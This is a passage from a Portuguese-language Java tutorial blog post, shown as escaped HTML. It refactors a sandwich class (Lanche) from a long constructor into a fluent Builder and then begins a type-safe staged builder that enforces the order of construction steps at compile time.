        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Aparentemente, essa classe é muito simples: é Java puro, não tem nada demais... Mas, como todo código, sempre tem algo a ser melhorado. &lt;/p&gt;

&lt;p&gt;Vamos tentar olhar de forma crítica, decifrando o que podemos melhorar.&lt;/p&gt;

&lt;p&gt;Não precisamos &lt;a href="https://blog.caelum.com.br/nao-aprender-oo-getters-e-setters/"&gt;&lt;em&gt;getters&lt;/em&gt; e &lt;em&gt;setters&lt;/em&gt;&lt;/a&gt;. Partiremos da ideia que só criamos getters quando realmente for necessário. Como colocamos tudo o que precisamos no construtor, não temos o perigo de construir objetos inválidos.&lt;/p&gt;

&lt;p&gt;Vamos ver como ficou a chamada para criar um lanche:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nc"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Tamanho&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;GRANDE&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nc"&gt;Pao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;PARMESAO_OREGANO&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;CHURRASCO&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
&lt;span class="nc"&gt;Queijo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;PRATO&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;of&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;ALFACE&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;CEBOLA&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt;
&lt;span class="nc"&gt;Molho&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;CHIPOTLE&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Bom, então o que tem para ser melhorado? No livro Código Limpo (&lt;em&gt;Clean Code&lt;/em&gt; de Robert Martin), no capítulo de funções há um item a respeito de parâmetros de funções (&lt;em&gt;Function Arguments&lt;/em&gt;):&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;A quantidade ideal de parâmetros para uma função é zero (nulo).&lt;br&gt;
Depois vem um (mônade), seguido de dois (díade).&lt;br&gt;
Sempre que possivel, devem-se evitar três parâmetros (tríade).&lt;br&gt;
Para mais de três, deve-se ter um motivo muito especial (políade) - mesmo assim não devem ser utilizados.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Pensando nessa frase, como faríamos para evitar chamar um construtor complexo ou vários &lt;em&gt;setters&lt;/em&gt; no objeto criado? &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#entrada-o-padr%C3%A3o-builder"&gt;
  &lt;/a&gt;
  Entrada: o padrão Builder
&lt;/h2&gt;

&lt;p&gt;Foi exatamente por esse motivo que surgiu o padrão &lt;em&gt;Builder&lt;/em&gt;, descrito no livro Padrões de Projetos (&lt;em&gt;Design Patterns: Elements of Reusable Object-Oriented Software&lt;/em&gt; do GOF). O Builder é um padrão de projetos criacional que permite a separação da construção de um objeto complexo da sua representação.&lt;/p&gt;

&lt;p&gt;O código ficaria assim:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Lanche&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="n"&gt;lancheBuilder&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lancheBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lancheBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lancheBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lancheBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lancheBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lancheBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;umLanche&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LancheBuilder&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="c1"&gt;//Nao deixando chamar o construtor de fora desta classe&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;LancheBuilder&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;grande&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;GRANDE&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;normal&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;NORMAL&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;comPao&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;comRecheio&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;comQueijo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;comVegetais&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;of&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;comMolho&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;Lanche&lt;/span&gt; &lt;span class="nf"&gt;constroi&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;E a chamada fica assim:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="nc"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;umLanche&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;grande&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;comPao&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="no"&gt;PARMESAO_OREGANO&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;comMolho&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="no"&gt;CHIPOTLE&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;comQueijo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="no"&gt;PRATO&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;comRecheio&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="no"&gt;CHURRASCO&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;comVegetais&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="no"&gt;ALFACE&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="no"&gt;CEBOLA&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;constroi&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Veja que deixei o construtor da classe &lt;code&gt;Lanche&lt;/code&gt; como privado e disponibilizei o método &lt;code&gt;umLanche&lt;/code&gt;, que devolve um Builder. Isso está descrito no livro Java Efetivo (&lt;em&gt;Effective Java&lt;/em&gt; de Joshua Bloch) e é chamado de &lt;em&gt;static factory&lt;/em&gt;. Diferente dos construtores conseguimos nomeá-los, fazendo com que fiquem mais descritivos. Além disso, podemos retornar um objeto que a princípio não é o mesmo de nossa classe.&lt;/p&gt;

&lt;p&gt;Agora nosso problema foi resolvido: em nossa classe &lt;code&gt;Lanche&lt;/code&gt; só temos um parâmetro no construtor: o &lt;code&gt;LancheBuilder&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;É o mais próximo do número de parâmetros ideal (zero/nulo).&lt;/p&gt;

&lt;p&gt;Não sei se todos já foram a lanchonete chamada Subway, mas há regras para montar nosso lanche: &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--B_z4eiIY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8pr3bfg69iwcwll9ftpy.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--B_z4eiIY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8pr3bfg69iwcwll9ftpy.png" alt="Subway funcionamento"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Costuma a funcionar um pouquinho diferente da foto, por isso vou detalhar a forma que os atendentes fazem:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Devemos escolher o recheio e o pão&lt;/li&gt;
&lt;li&gt;Escolhemos um tamanho&lt;/li&gt;
&lt;li&gt;Escolhemos o queijo&lt;/li&gt;
&lt;li&gt;Escolhemos os vegetais&lt;/li&gt;
&lt;li&gt;Por último, podemos ou não escolher um molho&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Essa lanchonete funciona exatamente nessa ordem. Com isso, conseguimos identificar problemas em nossa solução atual: da forma que fizemos o Builder, não temos uma ordem de chamada, perceba que chamei tudo fora de ordem e veja o que conseguimos fazer:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="nc"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;umLanche&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;constroi&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Nós pulamos todas as etapas, construimos um objeto em um estado inválido. OK, poderíamos lançar uma exceção caso algo esteja faltando.&lt;/p&gt;

&lt;p&gt;Mas será que nós conseguiríamos pegar todos os erros em tempo de compilação? Aí, não precisaríamos esperar o projeto rodar para descobrir. O código nem seria compilado. Mas e agora? Como fazer para garantir que só vamos construir o objeto se passarmos por todas as etapas?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#prato-principal-os-typesafe-builders"&gt;
  &lt;/a&gt;
  Prato Principal: os Type-safe Builders
&lt;/h2&gt;

&lt;p&gt;Os &lt;em&gt;Type-safe&lt;/em&gt; (ou Staged, ou Telescopic, ou Step) Builders nos auxiliam nas limitações que temos ao utilizar os Builders comuns.&lt;/p&gt;

&lt;p&gt;A ideia é bem simples: aproveitar o sistema de tipos do Java para garantir que no momento de compilação todas as propriedades sejam definidas antes que a instância da classe seja construída.&lt;/p&gt;

&lt;p&gt;Então, utilizando em nosso projeto a ideia do Type-safe Builder, construiremos nosso objeto em passos. Uma possível solução é a seguinte:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Lanche&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;LanchePassoFinalBuilder&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
